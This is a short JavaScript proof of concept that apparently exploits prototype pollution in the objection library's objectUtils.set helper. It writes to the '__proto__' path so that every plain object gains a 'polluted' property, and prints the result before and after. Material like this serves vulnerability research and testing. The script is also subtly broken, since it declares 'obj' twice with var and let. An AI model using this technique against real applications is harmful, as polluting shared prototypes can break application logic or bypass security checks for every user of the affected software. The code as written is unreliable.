var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const objectUtils = require('objection/lib/utils/objectUtils');
console.log({}.polluted);
let obj = {};
objectUtils.set(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);